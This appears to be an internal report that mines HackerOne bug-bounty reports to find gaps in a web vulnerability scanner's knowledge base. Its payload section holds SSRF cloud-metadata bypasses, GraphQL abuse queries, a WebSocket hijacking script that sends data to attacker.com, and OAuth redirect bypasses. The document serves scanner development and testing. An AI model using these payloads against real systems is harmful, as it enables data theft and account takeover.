# HackerOne Reports Analysis -- AnarCry KB Gap Assessment

**Data source:** /home/bullet/PROJETOS/hackerone-reports (15,050 reports)
**Analysis date:** 2026-11-25
**Current KB:** 46 entries covering 44 ScanRunner modules + Crawler

---

## 1. Coverage Map: H1 Vuln Categories vs AnarCry Modules

### Fully Covered (module + KB exist)

| H1 Category | Reports | AnarCry Module(s) |
|---|---|---|
| XSS (all types) | 2,464 | XSS, DomSinks |
| Information Disclosure | 1,441 | Secrets, ErrorDisclosure, JsAnalyzer, Crawler |
| CSRF | 511 | CSRF |
| IDOR | 359 | IDOR |
| Open Redirect | 342 | OpenRedirect |
| SQL Injection | 308 | SQLi |
| SSRF | 291 | SSRF |
| Path Traversal | 241 | LFI |
| Command Injection | 301 | CmdInjection |
| Cryptographic Issues | 188 | TLS, JWT, PQC |
| Clickjacking | 140 | Clickjacking |
| CRLF | 66 | CRLF |
| HTTP Request Smuggling | 67 | ReqSmuggling |
| Deserialization | 54 | Deserialization |
| Improper Certificate Validation | 53 | TLS |

### Covered via Composite Modules

| H1 Category | Reports | Covered By |
|---|---|---|
| Improper Authentication | 781 | JWT, OAuth, CSRF, RateLimit |
| Improper Access Control | 756 | IDOR, OAuth, CORS, Headers |
| Violation of Secure Design Principles | 803 | FrameworkConfig, Headers, HSTS, WAF |
| Privilege Escalation | 454 | IDOR, OAuth, JWT, MassAssign |
| Business Logic Errors | 390 | RaceCondition, MassAssign |
| Code Injection | 341 | SSTI, CmdInjection |
| Cleartext Storage | 74 | TLS, Secrets |
| Misconfiguration | 83 | FrameworkConfig, Headers, CORS, Actuator |

### Not Covered (outside scanner scope)

| H1 Category | Reports | Reason |
|---|---|---|
| Uncontrolled Resource Consumption (DoS) | 516 | Ethical constraint -- DoS testing risks target availability |
| Memory Corruption / Buffer Overflow | 576 | Binary-level vulns, not web app scope |
| Privacy Violation | 83 | Business logic, not detectable by scanner probing |

**Verdict: Zero coverage gaps for web vuln classes within scanner scope.**

---

## 2. High-Value Intel for KB Enrichment

### 2.1 SSRF (ssrf.md) -- Needs enrichment

**Missing patterns from H1 (high-bounty, real-world):**
- **Cloud metadata SSRF -> ROOT access** -- Shopify #341876 (585 upvotes) escalated SSRF via Exchange to ROOT on ALL instances. Pattern: SSRF -> http://169.254.169.254/latest/meta-data/iam/security-credentials/ -> AWS keys -> full takeover.
- **FFmpeg HLS processing SSRF** -- TikTok #1062888 ($2,727). Video upload triggers FFmpeg which follows HLS playlist URLs, enabling SSRF to internal services. Payload: craft `.m3u8` with internal URLs.
- **DNS Rebinding bypass** -- PortSwigger #3176157 (144 upvotes). MCP server SSRF via DNS rebinding bypasses allowlist -- first DNS resolution returns public IP (passes check), subsequent resolution returns internal IP.
- **SVG upload -> SSRF chain** -- Shopify #223203 (81 upvotes), Zivver #897244 (112 upvotes). Upload SVG with `<image xlink:href="http://internal/">`.
- **Webhook SSRF** -- Omise #508459 ($214 upvotes), HackerOne #2301565 ($2,500). Webhook URL accepts internal addresses.
- **Google Drive full-read SSRF** -- Dropbox #1406938 ($17,576). Import from Google Drive feature allows specifying internal URLs.

**Recommendation:** Add "Cloud Metadata Escalation" and "Media Processing SSRF" subsections to ssrf.md Escalation Techniques. Add DNS rebinding bypass to Payloads and Bypasses.

### 2.2 GraphQL (graphql.md) -- Needs significant enrichment

**Missing patterns:**
- **Introspection bypass via __schema prepend** -- Enjin #3452015 (75 upvotes). Prepend `__schema` to private operations to bypass auth on introspection.
- **IDOR via GraphQL mutations** -- HackerOne (5+ reports), Shopify #2207248 ($5K), TikTok #984965. GraphQL node interface allows accessing any object by ID without authorization checks.
- **SQLi through GraphQL parameters** -- HackerOne #435066 (174 upvotes). `embedded_submission_form_uuid` parameter passed unsanitized to SQL.
- **DoS via mutation aliasing** -- HackerOne #3287208 ($12,500, 184 upvotes). Single request with thousands of aliases for the same expensive mutation.
- **Deactivated user access** -- GitLab #1192460 (47 upvotes). Deactivated users retain GraphQL access.
- **Staff permission leak via GraphQL** -- Shopify #898528 (173 upvotes). `AdminGenerateSessionPayload` leaked to unprivileged staff.

**Recommendation:** This is the HIGHEST-PRIORITY KB enrichment. GraphQL attacks are high-bounty ($12.5K max in this dataset) and our graphql.md likely needs: introspection bypass techniques, IDOR via node interface, mutation aliasing DoS, and batching attacks.

### 2.3 OAuth (oauth.md) -- Needs enrichment

**Missing patterns:**
- **redirect_uri bypass via IDN homograph** -- Semrush #861940 (265 upvotes). Unicode domain confusable with target domain passes redirect_uri validation.
- **OAuth code theft via referer leakage** -- Rockstar Games (4 reports totaling 420+ upvotes). OAuth authorization code leaked in Referer header when redirect page loads external resources.
- **Sign in with Apple bypasses 2FA** -- Cloudflare #1593404 ($1,000, 32 upvotes). Apple SSO creates session that bypasses existing 2FA requirement.
- **Race condition in OAuth flows** -- Internet Bug Bounty #55140 (51 upvotes). Concurrent token exchange requests can be exploited.
- **OAuth CSRF on authorization** -- X/xAI #215381 (74 upvotes). Missing state parameter allows cross-site authorization.

**Recommendation:** Add IDN homograph and referer leakage bypass techniques. Add "OAuth -> ATO" escalation chain.

### 2.4 WebSocket (websocket_security.md) -- Needs enrichment

**Missing patterns from H1:**
- **Cross-Site WebSocket Hijacking (CSWSH)** -- Grammarly #535436 ($800, 134 upvotes), Uber #201326 ($2K, 50 upvotes), socket.io #931197 (27 upvotes). Missing Origin validation allows cross-site WebSocket connections that inherit cookies.
- **GraphQL introspection via unauthenticated WebSocket** -- Nuri #862835 (17 upvotes). WebSocket transport for GraphQL bypasses REST-level auth checks.
- **WebSocket -> info disclosure** -- Shopify #1023669 (25 upvotes). Staff without permissions can listen to Ping conversations via WebSocket events. Bykea #2209750 (64 upvotes) leaked trip data.
- **Mattermost post sanitization bypass** -- #2541027 (40 upvotes, $150). Posts via WebSocket bypass sanitization applied to REST API.

**Recommendation:** CSWSH is the #1 WebSocket attack class and should be the primary detection target. Add specific payloads for Origin header bypass testing.

### 2.5 Cache Poisoning (cachepoisoning.md) -- Needs enrichment

**Critical distinction missing: Web Cache Deception (WCD) vs Web Cache Poisoning (WCP)**

- **WCD for token theft** -- Glassdoor #1343086 (60 upvotes), Expedia #1698316 (159 upvotes) led to ATO. WCD tricks cache into storing authenticated page at guessable URL.
- **WCP -> Stored XSS** -- Glassdoor #1424094 (133 upvotes). Poison cache with XSS payload.
- **WCP -> DoS** -- PayPal #622122 ($9,700, 851 upvotes). Poison cache to serve error pages.
- **CORS + WCP chain** -- WordPress #591302 (405 upvotes). Poison CORS Allow-Origin header in cache.
- **HTTP/2 smuggling -> WCP** -- Basecamp #919175 (28 upvotes).

**Recommendation:** Add Web Cache Deception as distinct attack type. Add DoS escalation path. This is high-bounty territory ($9.7K on PayPal).

### 2.6 File Upload (file_upload_bypass.md) -- Needs enrichment

**Missing patterns:**
- **RCE via logo/image upload** -- Semrush #403417 (823 upvotes). Logo upload feature accepts executable content.
- **SVG upload -> XXE/SSRF/XSS triple threat** -- Multiple reports. SVG is XML, enables all XML-based attacks.
- **FFmpeg HLS SSRF via video upload** -- TikTok #1062888 ($2,727).
- **Blind XSS via image metadata** -- Upload image with XSS in EXIF data, triggers when admin views metadata.
- **IDOR in upload endpoint** -- Upload to another user's context.
- **ExifTool RCE** -- GitLab #1154542 ($20K, 508 upvotes). CVE-2021-22204.

**Recommendation:** Add SVG-based attacks section. Add media processing chain (FFmpeg, ExifTool, ImageMagick).

### 2.7 Subdomain Takeover (subdomain_takeover.md) -- Needs enrichment

**High-value chains from H1:**
- **S3 Bucket Takeover** -- IBM #2498255 (71 upvotes), Brave x2, Khan Academy, TikTok. Unclaimed S3 buckets on CNAME records.
- **Firebase Takeover** -- MTN Group (3 reports). Firebase databases accessible/takeable.
- **Auth bypass via subdomain takeover** -- Roblox #335330 (782 upvotes!!), Uber #219205 (182 upvotes). Takeover subdomain -> forge auth cookies scoped to parent domain -> full ATO.
- **Docker Registry exposure** -- Semmle #347296 (83 upvotes). Public Docker registry on subdomain enables image poisoning.

**Recommendation:** Auth bypass chain is the HIGHEST-IMPACT subdomain takeover escalation. Add specific cloud provider takeover fingerprints (S3, Firebase, Vercel, Netlify).

### 2.8 NoSQL Injection (nosql_injection.md) -- Needs enrichment

**H1 patterns:**
- **Pre-auth Blind NoSQLi -> RCE** -- Rocket.Chat #1130721 (20 upvotes). JavaScript injection via `$where` operator.
- **NoSQLi -> S3 URL disclosure** -- Rocket.Chat #1458020 (3 upvotes). Extracted signed S3 URLs.
- **NoSQLi -> data exfiltration** -- Rocket.Chat #2580062 (29 upvotes). Leaked visitor tokens and livechat messages.

**Recommendation:** Add `$where` -> RCE escalation path. Rocket.Chat is a great real-world case study to reference.

### 2.9 Prototype Pollution (prototype_pollution.md) -- Needs enrichment

**H1 patterns:**
- **PP -> XSS chain** -- GitLab Mermaid #1280002 + #1106238 ($3K each, 48+58 upvotes). Stored XSS via Mermaid diagram rendering. Elastic blog #998398 (157 upvotes).
- **PP -> Permission bypass** -- Node.js #1877919 (8 upvotes). `__proto__.require()` bypasses Node.js permission system.
- **PP -> DoS** -- Node.js #3560402 (22 upvotes). `__proto__` in `req.headersDistinct` crashes process.

**Recommendation:** PP -> XSS is the most common real-world impact. Add Mermaid/client-side library chains.

### 2.10 Race Condition (race_condition.md) -- Needs enrichment

**H1 patterns:**
- **2FA bypass via race** -- HackerOne #2598548 (139 upvotes). Concurrent requests bypass TOTP validation.
- **OAuth race** -- IBB #55140 (51 upvotes). Double token exchange.
- **GitHub race conditions** -- #2216036 + #2357443 (50+50 upvotes). Repo transfer/update API + GraphQL mutation race enables persistent admin access retention.

**Recommendation:** Add 2FA bypass as escalation technique. Add "persistent access via race" pattern from GitHub reports.

---

## 3. Missing Escalation Chains (Cross-Module)

These high-value attack chains appear repeatedly in top H1 reports but aren't documented in any single KB entry:

### 3.1 SSRF -> Cloud Metadata -> Full Compromise
```
SSRF -> http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
     -> AWS access key + secret key
     -> S3 access, EC2 control, full infrastructure compromise
```
**H1 evidence:** Shopify #341876 (ROOT on all instances), Dropbox #923132 ($4,913), Vimeo #549882, Snapchat #530974.
**KB action:** Already partially in ssrf.md payloads, needs dedicated escalation section.

### 3.2 Subdomain Takeover -> Auth Bypass -> ATO
```
Dangling CNAME -> claim subdomain -> set cookies scoped to parent domain
                                   -> victim visits any page on parent domain
                                   -> attacker's cookie overrides auth session
                                   -> full account takeover
```
**H1 evidence:** Roblox #335330 (782 upvotes), Uber #219205 (182 upvotes).
**KB action:** Add to subdomain_takeover.md Escalation Techniques.

### 3.3 Cache Poisoning -> Stored XSS -> ATO
```
Poison cache with malicious header -> CDN serves XSS payload to all visitors
                                   -> steal session tokens
                                   -> mass account takeover
```
**H1 evidence:** Slack #737140 (868 upvotes, mass ATO via smuggling+cache), Glassdoor #1424094 (133 upvotes).
**KB action:** Add to cachepoisoning.md Escalation Techniques.

### 3.4 Open Redirect -> OAuth Token Theft -> ATO
```
Find open redirect on target -> use as OAuth redirect_uri
                             -> victim authorizes app
                             -> code/token sent to attacker via redirect
```
**H1 evidence:** Uber #206591 (144 upvotes), CS Money #905607 (356 upvotes).
**KB action:** Add to both openredirect.md and oauth.md.

### 3.5 Spring Actuator -> Credential Leak -> Full Takeover
```
/actuator/env -> leak DB credentials, API keys, JWT secrets
/actuator/heapdump -> dump JVM memory -> extract session tokens
/actuator/gateway/routes -> map internal services
```
**H1 evidence:** LINE Corp #862589 ($5K, 143 upvotes) + #838635 ($12.5K, 234 upvotes).
**KB action:** Already partially in spring_actuator_exposure.md, verify completeness.

### 3.6 GraphQL IDOR -> Mass Data Exfiltration
```
Enumerate node IDs via GraphQL introspection
-> access any object by ID via node interface
-> no authorization check on resolution
-> dump all user data, billing, internal records
```
**H1 evidence:** HackerOne #489146 (1033 upvotes), Shopify #2207248 ($5K), TikTok #984965.
**KB action:** Add to graphql.md Escalation Techniques.

---

## 4. Payload Gaps Identified

### 4.1 SSRF -- Missing bypass payloads
```
# DNS rebinding
# Craft DNS record that alternates between public and internal IP
attacker.com -> first lookup: 1.2.3.4 (passes allowlist)
attacker.com -> second lookup: 169.254.169.254 (hits metadata)

# IPv6 bypass
http://[::ffff:169.254.169.254]/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/

# Azure metadata (not just AWS/GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true

# DigitalOcean metadata
http://169.254.169.254/metadata/v1/
```

### 4.2 GraphQL -- Missing attack payloads
```graphql
# Introspection bypass via __schema prepend
query __schema { __schema { types { name } } }

# Mutation aliasing DoS
mutation { a1: expensiveOp(input: {...}) a2: expensiveOp(input: {...}) ... a1000: expensiveOp(input: {...}) }

# Batching attack
[{"query":"mutation{deleteUser(id:1)}"}, {"query":"mutation{deleteUser(id:2)}"}, ...]

# Field suggestion probe (error messages leak field names)
{ user { nonexistent } }
# Error: "Did you mean 'name', 'email', 'password'?"

# Nested query DoS (depth attack)
{ user { friends { friends { friends { friends { name } } } } } }
```

### 4.3 WebSocket -- Missing CSWSH payloads
```html
<!-- Cross-Site WebSocket Hijacking -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(e) {
    // Exfiltrate data to attacker
    fetch('https://attacker.com/log?data=' + btoa(e.data));
};
</script>
```

### 4.4 OAuth -- Missing bypass payloads
```
# IDN homograph redirect_uri
redirect_uri=https://tаrget.com/callback  (Cyrillic 'а' instead of Latin 'a')

# Path traversal in redirect_uri
redirect_uri=https://target.com/callback/../../../attacker.com

# Fragment-based bypass
redirect_uri=https://target.com/callback#@attacker.com

# Open redirect chain
redirect_uri=https://target.com/redirect?url=https://attacker.com
```

---

## 5. Priority Recommendations

### P0 -- Immediate KB enrichment (high-impact, data ready)

1. **graphql.md** -- Add introspection bypass, IDOR via node interface, mutation aliasing DoS, batching attacks. GraphQL is #4 by H1 report volume for our covered categories and highest bounty ($12.5K single report).

2. **ssrf.md** -- Add cloud metadata escalation chain (AWS/GCP/Azure/DO), DNS rebinding bypass, FFmpeg/media processing SSRF, IPv6 bypass payloads.

3. **cachepoisoning.md** -- Add Web Cache Deception as distinct attack type. WCD -> ATO is a proven high-bounty chain.

4. **oauth.md** -- Add IDN homograph bypass, referer leakage, race condition in token exchange, Apple/Google SSO bypass chains.

### P1 -- KB enrichment (medium-impact)

5. **websocket_security.md** -- Add CSWSH attack payloads and Origin bypass techniques.
6. **subdomain_takeover.md** -- Add auth bypass chain (cookie scoping), cloud provider fingerprints (S3/Firebase/Vercel).
7. **file_upload_bypass.md** -- Add SVG-based attacks (XXE/SSRF/XSS), media processing chains (FFmpeg, ExifTool).
8. **race_condition.md** -- Add 2FA bypass pattern, OAuth race, persistent access via race.

### P2 -- Cross-module chain documentation

9. Add "Escalation Chains" subsections referencing other modules' escalation paths where chains span multiple vuln classes.

### Not Recommended

- **DoS module**: Ethically problematic for automated scanning. Keep as manual testing guidance in KB only.
- **Account Takeover module**: ATO is a result, not a vuln class. Already covered by component modules.
- **Memory corruption**: Outside web scanner scope entirely.

---

## 6. Stats Summary

| Metric | Value |
|---|---|
| H1 reports analyzed | 15,050 |
| H1 vuln categories mapped | 40+ |
| AnarCry modules with KB | 46 entries / 44 modules |
| Coverage gaps (web vuln scope) | **0** |
| KB entries needing enrichment | **8** (priority-ordered above) |
| Missing payload categories | **4** (SSRF bypass, GraphQL attacks, CSWSH, OAuth bypass) |
| Missing escalation chains | **6** cross-module chains |
| New module recommendations | **0** (all high-volume categories covered) |
